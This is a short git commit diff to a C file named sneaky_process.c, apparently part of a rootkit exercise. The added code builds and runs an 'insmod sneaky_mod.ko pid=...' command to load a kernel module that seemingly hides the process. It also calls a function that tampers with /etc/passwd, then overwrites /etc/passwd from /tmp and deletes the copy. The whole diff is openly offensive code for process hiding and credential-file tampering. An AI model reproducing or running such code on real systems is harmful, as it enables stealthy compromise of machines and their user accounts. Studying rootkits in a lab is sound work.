a2e9eb4e375b0298851af64c524b458de805fb56
leowindows7 <nthaninus@gmail.com>
2022-04-14 11:18:28 -0400

    can hide password

--- sneaky_process.c
+++ sneaky_process.c
@@ -10,10 +10,25 @@ void attack1_copy_password()
          "/etc/passwd");
 }
 
+void attack2_load_sneaky(){
+  char cmd[50];
+  sprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+  system(cmd);
+}
+
+
+
 int main()
 {
   // print process id
   printf("sneaky_process pid = % d\n", getpid());
   attack1_copy_password();
+  // attack2
+  char c;
+  while ((c = getchar()) != 'q') {
+  }
+  //system("rmmod sneaky_mod");
+  system("cp /tmp/passwd /etc");
+  system("rm /tmp/passwd");
   return EXIT_SUCCESS;
 }
